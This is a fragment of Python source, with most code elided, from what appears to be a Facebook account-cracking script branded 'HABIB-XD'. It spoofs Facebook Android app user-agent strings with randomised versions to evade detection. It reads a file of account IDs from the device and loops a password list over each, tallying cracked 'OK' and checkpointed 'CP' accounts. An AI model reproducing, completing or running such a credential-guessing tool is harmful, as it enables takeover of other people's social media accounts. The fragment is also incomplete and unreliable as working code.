...
def uax():
    END = '[FBAN/FB4A;FBAV/445.0.0.34.118;FBBV/448014984;FBDM/{density=3.5,width=1440,height=2792};FBLC/en_GB;FBRV/0;FBCR/Grameenphone;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G955FD;FBSV/1.1.1;FBOP/8;FBCA/armeabi-v7a:armeabi;]'
    ua = f'Dalvik/2.1.0 (Linux; U; Android {random.randint(4,13)}; SM-G955FD  Build/SP1A.{random.randint(111111,999999)}.{random.randint(111,999)}) '+END
    return ua
...
def __filexx__():
    clear()
    print(f"{S}={T}[{G}≣{T}]{S}={A} EXAMPLE : /sdcard/HABIB.txt ");linex();filex=input(f'{S}={T}[{G}?{T}]{S}={A} FILE NAME : ')
    try:
...
def filemethod(ids,names,passlist):
    ...
    try:
        ...
        try:
            ...
            ln=fn
        for pw in passlist:
            sys.stdout.write(f'\r\r{S}={T}[{G1}HABIB-XD{T}]{S}={Y} %s {G}OK{T}/{P}CP{G} %s{T}/{P}%s '%(loop,len(oks),len(cps)));sys.stdout.flush()
